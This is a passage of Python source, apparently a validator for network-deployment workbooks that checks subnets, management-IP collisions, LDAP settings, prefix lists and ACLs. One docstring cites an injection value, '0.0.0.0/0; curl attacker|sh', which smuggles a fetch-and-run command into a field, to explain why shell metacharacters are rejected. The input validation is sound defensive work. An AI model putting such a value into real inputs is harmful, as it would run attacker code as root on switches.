                f"IP {ip_str} is not within any OOB VLAN subnet "
                f"({_planes}). It would be unreachable — assign an IP "
                f"inside the node's OOB subnet, or widen the subnet.")

    # (d) Distinct OOB subnets require L3 OOB.
    mode = str(settings.get('oob_uplink_mode', 'l2') or 'l2').strip().lower()
    if len(mapping['subnets']) > 1 and mode != 'l3':
        result.error(
            "VLANs & Profiles",
            "Multiple distinct OOB VLAN subnets require L3 OOB (set "
            "oob_uplink_mode = l3). A single shared OOB subnet is the "
            "only L2-OOB option.")

    # (e) OOB subnet capacity (hard-fail, ERA-41). Every host that lands on an
    # OOB subnet must fit: the Active Nodes-tab mgmt IPs inside it plus the
    # auto-derived infra that is NOT in the Nodes tab — gateway (oob-server-01)
    # + dhcp-oob in L2, and additionally external-dhcp/utility/external-conn/
    # ztp_server in L3. Surfaced live in the field: a /27 (30 usable) had to
    # hold 33, so dhcp-oob spilled to a different /27 and servers were
    # unreachable. The infra count tracks oob_reserved_for_mode() minus its 3
    # structural octets (network/.254/.255) — 2 in L2, 6 in L3.
    if oob_nets:
        infra = max(len(oob_reserved_for_mode(mode)) - 3, 0)
        node_addrs = []
        for n in parsed_nodes:
            ip_str = n.get('ip')
            if not ip_str:
                continue
            try:
                node_addrs.append(ipaddress.IPv4Address(ip_str))
            except ValueError:
                continue  # malformed IP already reported elsewhere
        for net in oob_nets:
            usable = net.num_addresses - 2  # minus network + broadcast
            on_subnet = sum(1 for a in node_addrs if a in net)
            required = on_subnet + infra
            if required > usable:
                extra = ("gateway + dhcp-oob + external-dhcp/utility/"
                         "external-conn + ztp_server" if mode == 'l3'
                         else "gateway + dhcp-oob")
                result.error(
                    "VLANs & Profiles",
                    f"OOB subnet {net} holds {usable} usable addresses but the "
                    f"deployment needs {required} ({on_subnet} Nodes-tab mgmt "
                    f"IPs + {infra} auto-derived infra: {extra}). Widen the OOB "
                    f"subnet, or split hosts across multiple OOB VLANs (L3 OOB).")


def _validate_air_mgmt_overlap(air_mgmt_subnet, oob_subnets, result):
    """The air-mgmt subnet (Air_Only "Air Management Subnet") and the OOB
    VLAN subnet(s) (VLANs & Profiles, VRF=OOB) must be disjoint — Air
    virtual-node IPs and OOB switch management IPs collide otherwise. Lives
    here (not validate_settings) because air_mgmt_subnet is authored on the
    Air_Only sheet, and the OOB VLAN subnets require the Nodes + VLANs sheets
    to be parsed first — both only resolved later in
    validate_excel().
    """
    if not air_mgmt_subnet or not str(air_mgmt_subnet).strip():
        return
    try:
        air_net = ipaddress.IPv4Network(str(air_mgmt_subnet).strip(), strict=False)
    except ValueError:
        result.error("Air_Only", f"Invalid air_mgmt_subnet CIDR: '{air_mgmt_subnet}'")
        return
    for part in (oob_subnets or []):
        part = str(part).strip()
        if not part:
            continue
        try:
            mnet = ipaddress.IPv4Network(part, strict=False)
        except ValueError:
            continue  # malformed OOB VLAN subnet already reported elsewhere
        if air_net.overlaps(mnet):
            result.error("Air_Only",
                         f"air_mgmt_subnet '{air_mgmt_subnet}' overlaps with "
                         f"OOB VLAN subnet '{mnet}'. These must be disjoint — "
                         f"Air virtual node IPs vs. OOB switch management IPs "
                         f"collide otherwise.")


def validate_ldap_servers_plane(settings, result):
    """ERA-93: catch an `ldap_servers` pre-fill left on the default air-mgmt plane.

    Every shipped workbook pre-fills `ldap_servers = 172.20.0.78` — the
    `utility` jump on the default air-mgmt subnet. That is a helpful default
    only while the plane IS the default. Move `air_mgmt_subnet` and the
    pre-fill silently points at an address on a network the deployment does not
    have; nothing complains, because the value is a syntactically valid IP.

    Inert wherever `ldap.enabled` is false, which is why it has never bitten —
    but it is a live trap for the first deployment that enables LDAP on a moved
    subnet, so it is reported when (and only when) both conditions hold.
    """
    settings = settings or {}
    if str(settings.get('ldap_enabled', '') or '').strip().lower() not in ('yes', 'true', '1'):
        return

    declared = str(settings.get('air_mgmt_subnet') or '').strip()
    if not declared:
        return
    try:
        declared_net = ipaddress.IPv4Network(declared, strict=False)
        default_net = ipaddress.IPv4Network(DEFAULT_AIR_MGMT_SUBNET)
    except ValueError:
        return  # a malformed CIDR is reported by its own gate
    if declared_net == default_net:
        return

    for part in str(settings.get('ldap_servers') or '').split(','):
        part = part.strip()
        if not part:
            continue
        try:
            addr = ipaddress.IPv4Address(part.split('/')[0])
        except ValueError:
            continue  # invalid IPs are reported by validate_settings
        if addr in default_net and addr not in declared_net:
            result.error(
                "Settings",
                f"ldap_servers contains {part}, which is on the DEFAULT "
                f"air-mgmt subnet ({DEFAULT_AIR_MGMT_SUBNET}), but this "
                f"deployment declares air_mgmt_subnet {declared}. That address "
                f"does not exist here — the shipped template pre-fills the "
                f"utility jump's default address and it was not updated when "
                f"the plane moved. With ldap_enabled=Yes the switches will ship "
                f"pointing at an unreachable LDAP server."
            )


def validate_oob_mgmt_ip_collisions(parsed_nodes, result, settings=None,
                                    oob_subnets=None, parsed_vlans=None):
    """Hard gate against silent mgmt-IP collisions on either management plane.

    ERA-93: `oob_subnets` is the list of OOB VLAN subnets the workbook actually
    declares. This gate used to assume 192.168.200.0/24, so on a brownfield
    workbook every claim fell outside the registry's view and the check passed
    while inspecting nothing — it was structurally unable to see ERA-92. Passing
    the declared subnets is what lets it fail on a real input.

    OOB plane (192.168.200.0/24 by default, matching production VLAN 200): no two hosts
    may share a mgmt IP, and no Nodes-tab host may land on an octet reserved
    for Air infrastructure. The reserved set is OOB-mode-aware — L3 reserves the
    EXIT-VRF trio (external-dhcp .77 / utility .78 / external-conn .79); L2 (the
    default) does not, since those nodes don't exist there. A duplicate triggers
    an ARP/DAD war and ~60% packet loss to the colliding host — surfacing only
    at validate-servers time as an unexplained "hang". Root-caused 2026-06-24 on
    2-8-9-400/maxscale (L3) where a server and the L3-OOB jump (utility) both
    landed on .200.78.

    Air-mgmt plane (the Air_Only "Air Management Subnet", default 172.20.0.0/24):
    this /24 is reserved end-to-end for auto-assigned switch eth0 IPs plus the
    fixed L3-trio / SVI octets, so a Nodes-tab host must NEVER land here — it
    would silently collide with a switch eth0 the operator can't see. Both fail
    loudly at validate-excel time instead. See oob_reserved.py.
    """
    claims = []
    switch_claims = []
    for node in parsed_nodes:
        if not node.get('ip'):
            continue
        label = f"{node.get('function') or node.get('name') or '?'} (row {node.get('row')})"
        claims.append((label, node['ip']))
        if canonical_category(node.get('function'), node.get('name')) in _SWITCH_CATEGORIES:
            switch_claims.append((label, node['ip']))

    # Switch SVI addresses are GENERATED, not declared on the Nodes tab, so the
    # gate below could not see them and a switch SVI landing on a real host's
    # eth0 passed silently. Four largescale sites shipped 8 such duplicates
    # each (e.g. cl-01's eth0 and oob-switch-09's SVI both 192.168.200.10).
    # Derive them with the same helper the generator uses and claim them here,
    # so the gate covers every address that actually appears on the OOB VLAN.
    # Attribute switches to subnets the way the generator does. It indexes
    # PER SUBNET (`per_subnet_index` in build_oob_switch_configs), so a site
    # with two OOB VLANs and 6 switches on each gives every subnet idx 0..5 —
    # NOT idx 0..11. Claiming a global count against every subnet invents
    # phantom SVIs in the high block and fails a legitimate multi-subnet
    # workbook on a collision that does not exist. Caught in review on !264.
    _oob_nodes = [n for n in parsed_nodes
                  if canonical_category(n.get('function'), n.get('name')) == 'oob-switch']
    _per_subnet = {}
    if _oob_nodes:
        try:
            _map = resolve_oob_vlans(parsed_vlans or [], _oob_nodes)
            for _n in _oob_nodes:
                _vlan = (_map.get('vlan_by_switch') or {}).get(_n['name']) or {}
                _sub = (_vlan.get('subnet') or '').strip()
                if _sub:
                    _per_subnet.setdefault(_sub, []).append(_n['name'])
        except Exception:
            _per_subnet = {}
    if not _per_subnet:
        # No VLAN attribution available (older caller, or a workbook the
        # resolver could not map). Only safe to claim when a single subnet is
        # declared; with several, the split is unknown and guessing produces
        # false-positive build failures.
        _subs = [s for s in (oob_subnets or []) if str(s).strip()] or [OOB_SUBNET]
        if len(_subs) == 1:
            _per_subnet = {_subs[0]: [n['name'] for n in _oob_nodes]}

    for _sub, _members in _per_subnet.items():
        _parsed = _parse_cidr(_sub, context="OOB VLAN")
        if not _parsed:
            continue
        _net_ip, _prefix = _parsed
        _base = _net_ip.rsplit('.', 1)[0]
        try:
            _last = int(_net_ip.rsplit('.', 1)[1])
        except (ValueError, IndexError):
            _last = 0
        for _i, _name in enumerate(sorted(_members)):
            claims.append((f"{_name} SVI (generated)",
                           _oob_switch_svi_ip(_base, _last, _i, _prefix)))

    oob_mode = (settings or {}).get('oob_uplink_mode')
    _planes = [s for s in (oob_subnets or []) if str(s).strip()] or None
    _plane_desc = ", ".join(str(s) for s in _planes) if _planes else OOB_SUBNET
    for address, owners in find_oob_collisions(claims,
                                               oob_reserved_for_mode(oob_mode),
                                               subnets=_planes):
        result.error(
            "Nodes",
            f"mgmt IP {address} claimed by multiple owners on the OOB "
            f"management plane ({_plane_desc}): {'; '.join(owners)}. Duplicate "
            f"OOB addresses cause an ARP/DAD war on the OOB VLAN and ~60% "
            f"packet loss to the colliding host. Reassign the host to a free "
            f"address."
        )

    air_mgmt_subnet = (settings or {}).get('air_mgmt_subnet') or DEFAULT_AIR_MGMT_SUBNET

    # A SWITCH inside the air-mgmt subnet is an operator PIN, not an intruder:
    # that plane is where switch eth0 lives, and excel_parser honours the pin
    # verbatim instead of auto-assigning. Non-switch hosts have no business
    # there and still fail. Pins get their own two gates below.
    _switch_labels = {label for label, _ in switch_claims}
    for label, ip_str in air_mgmt_intruders(claims, air_mgmt_subnet):
        if label in _switch_labels:
            continue
        result.error(
            "Nodes",
            f"mgmt IP {ip_str} for {label} is inside the air-mgmt subnet "
            f"({air_mgmt_subnet}), which is reserved for auto-assigned switch "
            f"eth0 IPs and Air infrastructure (external-dhcp .77, utility .78, "
            f"bridge SVI .254). A Nodes-tab host here silently collides with a "
            f"switch eth0. Put the host on an OOB management subnet instead."
        )

    # Gates on operator-pinned switch eth0 addresses.
    try:
        _air_net = ipaddress.IPv4Network(str(air_mgmt_subnet).strip(), strict=False)
    except ValueError:
        _air_net = None
    if _air_net is not None:
        _pins = {}
        for label, ip_str in switch_claims:
            try:
                addr = ipaddress.IPv4Address(str(ip_str).strip().split('/')[0])
            except ValueError:
                continue  # malformed IP already reported elsewhere
            if addr not in _air_net:
                continue
            octet = int(addr) - int(_air_net.network_address)
            # (1) A pin must not squat an octet air-deploy.py provisions for
            # Air infrastructure — the switch and the infra node would both
            # claim it and one of them silently loses.
            owner = AIR_MGMT_RESERVED_OWNERS.get(octet)
            if owner:
                result.error(
                    "Nodes",
                    f"switch mgmt IP {addr} for {label} collides with "
                    f"{owner}, which Air provisions on that address. Pick "
                    f"another address inside {_air_net} for this switch."
                )
            _pins.setdefault(str(addr), []).append(label)
        # (2) Two switches must not pin the same address.
        for ip_str, owners in sorted(_pins.items()):
            if len(owners) > 1:
                result.error(
                    "Nodes",
                    f"switch mgmt IP {ip_str} is pinned by multiple switches "
                    f"({'; '.join(owners)}). Each switch eth0 needs its own "
                    f"address on the air-mgmt plane."
                )


_PREFIX_LIST_ID_RE = re.compile(r'^[A-Za-z0-9_-]+$')
_CIDR_RE = re.compile(r'^\d{1,3}(\.\d{1,3}){3}/\d{1,2}$')


def validate_prefix_lists(ws, result):
    """Validate the 'Prefix lists' sheet (security review #7).

    `pl.id` / `rule.id` / `rule.match` are interpolated into root-executed
    `nv set router policy prefix-list ...` lines (now `| quote`'d at render
    time, but this is the input-layer backstop). Enforce a strict charset so a
    cell like `0.0.0.0/0; curl attacker|sh` is rejected at ingest rather than
    relying solely on render-time quoting. Mirrors parse_prefix_lists_sheet's
    column layout (1=List name, 2=Rule id, 3=Match CIDR, 4=Max prefix len).
    """
    if ws.max_row < 2:
        return
    header_row = 1
    for r in range(1, min(ws.max_row + 1, 5)):
        val = ws.cell(row=r, column=1).value
        if val and str(val).strip().lower() == 'list name':
            header_row = r
            break
    for row in range(header_row + 1, ws.max_row + 1):
        list_name = ws.cell(row=row, column=1).value
        if not list_name or not str(list_name).strip():
            continue
        list_id = str(list_name).strip()
        if list_id.lower() == 'list name':
            continue
        rule_id = ws.cell(row=row, column=2).value
        match_val = ws.cell(row=row, column=3).value
        if not _PREFIX_LIST_ID_RE.match(list_id):
            result.error("Prefix lists",
                         f"row {row}: list name {list_id!r} must match "
                         f"[A-Za-z0-9_-]+ (rendered into a root-executed switch "
                         f"config — no spaces or shell metacharacters).")
        if rule_id is not None and str(rule_id).strip():
            rid = str(rule_id).strip()
            if not re.fullmatch(r'\d+', rid):
                result.error("Prefix lists",
                             f"row {row}: rule id {rid!r} must be a positive integer.")
        if match_val is not None and str(match_val).strip():
            mv = str(match_val).strip()
            # Strip an optional ' le N' / ' ge N' suffix before the CIDR check.
            core = re.sub(r'\s+(le|ge)\s+\d{1,2}\b', '', mv).strip()
            if _SHELL_META_RE.search(mv) or not _CIDR_RE.match(core):
                result.error("Prefix lists",
                             f"row {row}: match {mv!r} must be a CIDR (e.g. "
                             f"10.0.0.0/8, optionally with 'le N'/'ge N') — shell "
                             f"metacharacters are rejected to prevent command "
                             f"injection.")


_ACL_PROTOCOLS = frozenset({'tcp', 'udp', 'ip', 'icmp'})
# Baseline control-plane security ACLs (ADR-0030). Suppressing either drops the
# switch's control-plane protection — honored, but warned.
_SECURITY_DEFAULT_ACLS = frozenset({'acl-default-dos', 'acl-default-whitelist'})


def validate_acls(ws, result):
    """Validate the optional 'ACLs' sheet (ADR-0030).

    `acl name` / `rule id` / `protocol` / `dest port` are interpolated into
    root-executed `nv set acl ...` lines (each `| quote`'d at render time; this
    is the input-layer backstop). Enforce a strict charset and sane
    protocol/port values. Columns: 1=ACL name, 2=Rule id, 3=Protocol,
    4=Dest port, 5=Action. Suppressing a baseline control-plane ACL is allowed
    but warned. Absent/empty sheet ⇒ no checks (derive-by-default).
    """
    if ws.max_row < 2:
        return
    header_row = 1
    for r in range(1, min(ws.max_row + 1, 5)):
        val = ws.cell(row=r, column=1).value
        if val and str(val).strip().lower() == 'acl name':
            header_row = r
            break
    for row in range(header_row + 1, ws.max_row + 1):
        acl_name = ws.cell(row=row, column=1).value
        if not acl_name or not str(acl_name).strip():
            continue
        name = str(acl_name).strip()
        if name.lower() == 'acl name':
            continue
        rule_id = ws.cell(row=row, column=2).value
        protocol = ws.cell(row=row, column=3).value
        dest_port = ws.cell(row=row, column=4).value
        action_val = ws.cell(row=row, column=5).value
        action = str(action_val).strip().lower() if action_val else ''
        if not _PREFIX_LIST_ID_RE.match(name):
            result.error("ACLs",
                         f"row {row}: ACL name {name!r} must match [A-Za-z0-9_-]+ "
                         f"(rendered into a root-executed switch config — no "
                         f"spaces or shell metacharacters).")
        if action == 'suppress':
            if name in _SECURITY_DEFAULT_ACLS:
                result.warn("ACLs",
                            f"row {row}: suppressing {name!r} removes a baseline "
                            f"control-plane security ACL from every switch — make "
                            f"sure that's intended.")
            continue  # a suppress row carries no rule to validate
        if rule_id is not None and str(rule_id).strip():
            rid = str(rule_id).strip()
            if not re.fullmatch(r'\d+', rid):
                result.error("ACLs",
                             f"row {row}: rule id {rid!r} must be a positive integer.")
        if protocol is not None and str(protocol).strip():
            proto = str(protocol).strip().lower()
            if proto not in _ACL_PROTOCOLS:
                result.error("ACLs",
                             f"row {row}: protocol {proto!r} must be one of "
                             f"{sorted(_ACL_PROTOCOLS)}.")
        if dest_port is not None and str(dest_port).strip():
            dp = str(dest_port).strip()
            if isinstance(dest_port, float) and dest_port.is_integer():
                dp = str(int(dest_port))
            if not re.fullmatch(r'\d+', dp) or not (1 <= int(dp) <= 65535):
                result.error("ACLs",
                             f"row {row}: dest port {dp!r} must be an integer "
                             f"1..65535.")


# ---------------------------------------------------------------------------
# Main validation
# ---------------------------------------------------------------------------

def validate_excel(xlsx_path):
    """Run all validation checks on an Excel file. Returns ValidationResult."""
    result = ValidationResult()

    path = Path(xlsx_path).resolve()
    if not path.exists():
        result.error("File", f"Not found: {path}")
        return result
    if path.suffix.lower() not in ('.xlsx', '.xlsm'):
        result.error("File", f"Not an Excel file: {path.name}")
        return result

    print(f"Validating: {path.name}")
    print(f"{'='*60}")

    try:
        wb = openpyxl.load_workbook(path, data_only=True)
    except Exception as e:
        result.error("File", f"Cannot open workbook: {e}")
        return result

    # 1. Sheet existence
    print("  Checking sheets...")
    validate_sheets(wb, result)

    # 2. Settings
    if 'Settings' in wb.sheetnames:
        print("  Checking Settings...")
        settings = validate_settings(wb['Settings'], result)
    else:
        settings = {}

    # 2b. air_mgmt_subnet is authored on the Air_Only sheet (row "Air Management
    #     Subnet"), NOT Settings — and that is the value the parser/deploy use
    #     (excel_parser.parse_air_settings). Surface it into `settings` so the
    #     mgmt-IP collision gate (8b) honors a customized subnet instead of the
    #     hardcoded default. Air_Only is authoritative (matches the deploy).
    # The S9 overlap check itself (vs. the OOB VLAN subnets)
    #     runs below, once Nodes + VLANs & Profiles are parsed.
    if 'Air_Only' in wb.sheetnames:
        _air_settings = parse_air_settings(wb['Air_Only'])
        if _air_settings.get('air_mgmt_subnet'):
            settings['air_mgmt_subnet'] = _air_settings['air_mgmt_subnet']

    # 3. Nodes
    parsed_nodes = []
    if 'Nodes' in wb.sheetnames:
        print("  Checking Nodes...")
        parsed_nodes = validate_nodes(wb['Nodes'], result, settings=settings)
        print(f"    {len(parsed_nodes)} nodes found")

    # Build the {name → canonical_function} lookup so downstream Wire
    # Map / Air_Only checks can cross-reference each row against the
    # Nodes tab (single source of truth).
    nodes_function_map = {}
    for n in parsed_nodes:
        name = (n.get('name') or '').strip()
        if name:
            cat = canonical_category(n.get('function'), name)
            if cat:
                nodes_function_map[name] = cat

    # 4. VLANs & Profiles
    parsed_vlans = []
    if 'VLANs & Profiles' in wb.sheetnames:
        print("  Checking VLANs & Profiles...")
        parsed_vlans = validate_vlans(wb['VLANs & Profiles'], result)
        print(f"    {len(parsed_vlans)} VLANs found: {[v['id'] for v in parsed_vlans]}")
        # 4a. VRFs section: uniqueness + L3 VNI sanity
        print("  Checking VRFs section...")
        validate_vrfs_section(wb['VLANs & Profiles'], parsed_vlans, result)
        # 4b. DHCP Relay table + per-VLAN DHCP Relay Client column
        print("  Checking DHCP Relay schema...")
        validate_dhcp_relay(wb['VLANs & Profiles'], parsed_vlans, result)
        # 4b.1 Port Profile Port Mode + L3 field compatibility (STORAGE VRF
        # rollout introduces Port Mode = L3 for external uplinks)
        print("  Checking Port Profiles...")
        validate_port_profiles(wb['VLANs & Profiles'], result)
        # 4c. gpu_vlan_mode must match the actual VLAN rows present.
        print("  Checking gpu_vlan_mode consistency...")
        validate_gpu_vlan_mode_consistency(settings, parsed_vlans, result)
        # 4d. Wire Map Network Profile values must resolve to known
        # Port Profile / VLAN row / Air- prefix.
        print("  Checking Wire Map Network Profile names...")
        validate_wiremap_network_profiles(wb, result)
        validate_wiremap_subports_fit_breakout(wb, result)
        validate_isl_parents_fully_accounted(wb, result)
        validate_isl_matches_arch_model(wb, settings, result)
        validate_fabric_optic_integrity(wb, result)
        validate_uplink_bandwidth_floors(wb, settings, result)
        # DRB Guidelines slides 10 and 12 — the E/W endorsement criteria.
        print("  Checking E/W network against DRB criteria...")
        validate_ew_uses_private_ips(wb, settings, result)
        validate_ew_not_oversubscribed(wb, settings, result)
        validate_ew_bandwidth_per_gpu(wb, settings, result)

    # 4e. S9 overlap check: air_mgmt_subnet (Air_Only) vs. the OOB VLAN
    # subnet(s) (VRF=OOB rows on VLANs & Profiles). Runs here —
    # not in step 2b — because it needs both parsed_nodes (to find the
    # OOB switches) and parsed_vlans (to resolve their VLAN subnets).
    _oob_nodes_for_overlap = [
        n for n in parsed_nodes
        if canonical_category(n.get('function'), n.get('name')) == 'oob-switch'
    ]
    _oob_subnets = resolve_oob_vlans(parsed_vlans, _oob_nodes_for_overlap)['subnets']
    _validate_air_mgmt_overlap(settings.get('air_mgmt_subnet'), _oob_subnets, result)
    validate_ldap_servers_plane(settings, result)

    def _print_wm_summary(sheet_name, total_rows, ports):
        """Print a wire-map summary breakdown: cables + skip reasons + dup status."""
        cables = len(ports)
        skip_breakdown = getattr(ports, 'skip_reasons', {}) or {}
        dup_count = getattr(ports, 'duplicate_count', 0)
        skip_total = sum(skip_breakdown.values())
        skip_detail = ', '.join(f"{n} {reason}" for reason, n in sorted(
            skip_breakdown.items(), key=lambda kv: -kv[1])) if skip_breakdown else ''
        print(f"    {total_rows} total rows, {cables} cables"
              + (f", {skip_total} skipped ({skip_detail})" if skip_total else ""))
        if cables:
            if dup_count:
                print(f"    ✗ {dup_count} duplicate switch-port assignment(s) — see errors above")
            else:
                print("    ✓ no duplicate switch-port assignments")

    # 4z. Shell-injection safety for every Excel cell that renders unquoted
    #     into a root-executed config (VRF/VLAN names, Port Profiles
    #     VRF/Speed/Auto-Negotiate, and the policy sheets).
    print("  Checking shell safety of unquoted Excel values...")
    validate_unquoted_excel_cells(wb, result)
    validate_node_name_charset(wb, result)

    # 5. Wire Map — port validation and duplicate detection
    wm_ports = {}
    if 'Wire Map' in wb.sheetnames:
        print("  Checking Wire Map...")
        wm_ports = validate_wire_map(wb['Wire Map'], result, "Wire Map",
                                     nodes_function_map=nodes_function_map,
                                     parsed_nodes=parsed_nodes)
        _print_wm_summary("Wire Map", wb['Wire Map'].max_row - 1, wm_ports)
        # 8x breakout convention check — odd base port + adjacent disabled.
        validate_8x_breakout_odd_ports(wb['Wire Map'], result, "Wire Map")
        print("  Checking switch hardware port limits...")
        validate_switch_hardware_ports(wb, settings, nodes_function_map, result)

    # 6. Air_Only
    air_ports = {}
    if 'Air_Only' in wb.sheetnames:
        print("  Checking Air_Only...")
        air_ports = validate_wire_map(wb['Air_Only'], result, "Air_Only",
                                      nodes_function_map=nodes_function_map,
                                      parsed_nodes=parsed_nodes)
        _print_wm_summary("Air_Only", wb['Air_Only'].max_row - 1, air_ports)

    # 6b. OOB-cabling completeness — every non-switch host on the Nodes
    # tab must have at least one Wire Map row that cables it to an OOB
    # switch with a populated peer port. Without that, the host gets no
    # eth0 management IP at boot and the deploy can't reach it. This
    # would have caught the sample2 "su-02..08 unreachable" failure
    # before the user pushed configs.
    if 'Wire Map' in wb.sheetnames and parsed_nodes:
        print("  Checking OOB management cabling completeness...")
        _validate_oob_cabling(wb['Wire Map'], parsed_nodes, result,
                              nodes_function_map=nodes_function_map)

    # 6c. OOB-switch air-infra capacity — the topology generator auto-injects
    # one swpN link from each OOB switch to air-oob-switch. If wiremap +
    # spine_bond eat all 52 ports, that injection silently fails.
    if 'Wire Map' in wb.sheetnames:
        print("  Checking OOB switch air-oob-switch port capacity...")
        _validate_oob_switch_air_capacity(wb['Wire Map'], result)

    # 7. Cross-sheet port conflict check
    if wm_ports and air_ports:
        print("  Checking cross-sheet port conflicts...")
        validate_cross_sheet_ports(wm_ports, air_ports, result)

    # 7b. Dual-plane consistency (only matters when planes are present)
    print("  Checking plane consistency...")
    validate_plane_consistency(wb, parsed_vlans, result)

    # 7b.1 ns_tiers/ew_tiers must match the spine roles actually declared.
    # roles_present = the canonical category of every switch node on the
    # Nodes tab (cs / gs-plane* etc. resolve to themselves).
    # Note: a *bare legacy* `tiers` is intentionally NOT fed into the live
    # check — many existing workbooks carry a stale `tiers=2` ("legacy
    # compatibility only") that does not reflect either fabric. Only an
    # explicit ns_tiers/ew_tiers declaration is validated against the
    # spine roles present; back-compat seeding of legacy `tiers` is covered
    # by the unit test on validate_tiers_consistency.
    print("  Checking ns_tiers/ew_tiers consistency...")
    roles_present = set(nodes_function_map.values())
    declared_tiers = {k: settings[k] for k in ('ns_tiers', 'ew_tiers')
                      if settings.get(k) not in (None, '')}
    if declared_tiers:
        for msg in validate_tiers_consistency(declared_tiers, roles_present):
            result.error("Settings", msg)

    # 7c. Loopbacks sheet (optional — only validates structure if present)
    _lb_name = loopbacks_sheet_name(wb)
    if _lb_name:
        print("  Checking Loopbacks...")
        validate_loopbacks(wb[_lb_name], parsed_nodes, parsed_vlans, settings, result)

    # There must be an ASN source — Settings.bgp_asn (legacy) OR a
    # populated Loopbacks ASN column. Without one, no base ASN resolves.
    if not settings.get('bgp_asn') and not loopbacks_asn_populated(wb):
        result.error("Settings",
                     "No BGP ASN source: Settings.bgp_asn is absent and the "
                     "Loopbacks tab has no populated ASN column. Provide one "
                     ".")

    # 8. Cross-sheet data validation (IPs within subnets, overlaps)
    if settings or parsed_nodes or parsed_vlans:
        print("  Checking cross-sheet data consistency...")
        validate_cross_sheet_data(settings, parsed_nodes, parsed_vlans, result)

    # 8b. mgmt-IP collision gate — hard fail on duplicate / reserved-octet IPs
    #     on the flat OOB /24 AND on any Nodes-tab host that strays into the
    #     air-mgmt /24 (both silently collide → ~60% packet loss / unreachable).
    if parsed_nodes:
        print("  Checking mgmt-IP collisions (OOB + air-mgmt planes)...")
        validate_oob_mgmt_ip_collisions(parsed_nodes, result, settings=settings,
                                        oob_subnets=_oob_subnets,
                                        parsed_vlans=parsed_vlans)
        validate_plane_symmetry(parsed_nodes, result)
        validate_dataplane_subnet_capacity(parsed_nodes, parsed_vlans, result)
        validate_dataplane_svi_collisions(parsed_nodes, parsed_vlans, result)

    # 8c. ERA-40 — prefix alignment. An isolated (GPU) subnet that lands inside
    #     the advertised loopback supernet leaks the compute fabric to the
    #     customer network via a rule that never names it.
    if parsed_vlans:
        print("  Checking prefix alignment (advertised vs isolated VRFs)...")
        validate_prefix_alignment(settings, parsed_vlans, result)

    # 8b. Prefix lists sheet (routed fabrics) — charset/CIDR gate (security review #7)
    if 'Prefix lists' in wb.sheetnames:
        print("  Checking Prefix lists...")
        validate_prefix_lists(wb['Prefix lists'], result)

    if 'ACLs' in wb.sheetnames:
        print("  Checking ACLs...")
        validate_acls(wb['ACLs'], result)

    if 'Custom_Config' in wb.sheetnames:
        print("  Checking Custom_Config...")
        validate_custom_config(wb['Custom_Config'], parsed_nodes, result)

    # 9. Single-tier SU scaling check
    if parsed_nodes:
        print("  Checking single-tier SU scaling...")
        validate_single_tier_su(settings, parsed_nodes, result)

    # 10. Air OOB cabling sanity (each active node should have exactly
    #     ONE Display=Yes OOB row — Air can only have 1 link up; multi
    #     Display=Yes per node causes Ubuntu loop/bond issues since
    #     plain Ubuntu doesn't handle bonded OOB the way real servers do)
    if 'Wire Map' in wb.sheetnames:
        print("  Checking Air OOB single-cable rule...")
        validate_air_oob_single_cable(wb['Wire Map'], parsed_nodes, result, settings)

    wb.close()
    return result


def _node_name_to_su_for_model(name, nodes_per_su, fallback):
    """Map compute-node names to SU using the active architecture model."""
    text = str(name or "").strip()
    match = re.match(r"gpu-(\d+)$", text)
    if match:
        return (int(match.group(1)) + int(nodes_per_su) - 1) // int(nodes_per_su)
    return fallback(text)


# ERA-40. VRFs whose subnets must reach cust-net-edge via ERA_PREFIXES, and
# those that must never. The parser derives ERA_PREFIXES by walking exactly
# these advertised VRFs; this check exists so the derivation cannot silently
# disagree with what the operator declared.
_ADVERTISED_VRFS = frozenset({'INBAND', 'OOB'})
_ISOLATED_VRFS = frozenset({'GPU'})
# Routed externally, but NOT through ERA_PREFIXES/cust-net-edge — the STORAGE
# VRF carries its own uplink and peering (ADR-0047: storage is L3-only and
# external). Absence from ERA_PREFIXES is correct for these, so they must not
# warn. Listed explicitly rather than folded into _ISOLATED_VRFS, because
# "isolated" would be a lie: storage is very much reachable, just not by this
# path.
_SEPARATELY_ROUTED_VRFS = frozenset({'STORAGE'})


def validate_custom_config(ws, parsed_nodes, result):
    """Validate the optional 'Custom_Config' sheet (ADR-0055).

    `make import` gates on THIS file, not on excel_parser — import runs
    validate_excel.py then copies the workbook; the parser only runs at
    `make generate`. Without this check a bad target would sail through the
    documented first step and only fail later, which is the wrong place to learn
    that a switch name is misspelled.

    Delegates to the parser so there is exactly one implementation of the rules;
    a second copy here would drift and start disagreeing about what is valid.
    """
    try:
        from excel_parser import (
            parse_custom_config_sheet,
            switches_by_function_from_nodes,
            servers_by_function_from_nodes,
            CustomConfigError,
        )
    except ImportError:  # pragma: no cover - parser always ships beside this
        return
    try:
        parse_custom_config_sheet(
            ws,
            switches_by_function=switches_by_function_from_nodes(parsed_nodes),
            servers_by_function=servers_by_function_from_nodes(parsed_nodes),
        )
    except CustomConfigError as exc:
        result.error('Custom_Config', str(exc))


def validate_prefix_alignment(settings, parsed_vlans, result):
    """ERA-40: an isolated VRF's subnet must not fall inside the advertised supernet.

    `ERA_PREFIXES` rule 10 is `<loopback_base>.0/21 max-prefix-len 24`, and it
    is applied outbound toward `cust-net-edge`. Any subnet that lands inside
    that supernet at /24 or shorter is therefore advertised *automatically*,
    with no explicit rule naming it.

    That is exactly what makes it dangerous. A GPU (East/West compute) VLAN
    given an address inside the loopback range would be published to the
    customer network by a rule that never mentions it — an isolation failure
    with nothing in the workbook or the generated config that looks wrong.

    The converse direction (an advertised subnet with no coverage) is handled
    by the parser, which adds an explicit rule for any INBAND/OOB subnet the
    supernet misses. It is asserted end-to-end in
    `tests/test_prefix_alignment.py` against the shipped workbooks; here we
    guard the direction the parser cannot fix for itself.
    """
    lb = str((settings or {}).get('loopback_base') or '').strip()
    if not lb:
        return
    try:
        supernet = ipaddress.ip_network(f'{lb}.0/21', strict=False)
    except ValueError:
        # loopback_base itself is validated elsewhere; nothing to do here.
        return

    for vlan in parsed_vlans or []:
        vrf = str(vlan.get('vrf') or '').strip().upper()
        subnet = str(vlan.get('subnet') or '').strip()
        if not vrf or '/' not in subnet:
            continue
        try:
            net = ipaddress.ip_network(subnet, strict=False)
        except ValueError:
            continue

        if vrf in _ISOLATED_VRFS:
            if net.prefixlen <= 24 and net.subnet_of(supernet):
                result.error(
                    "VLANs & Profiles",
                    f"VLAN {vlan.get('id') or vlan.get('name')}: subnet "
                    f"{subnet} is in VRF {vrf}, which must stay isolated, but "
                    f"it falls inside the advertised supernet {supernet} "
                    f"(ERA_PREFIXES rule 10, max-prefix-len 24). It would be "
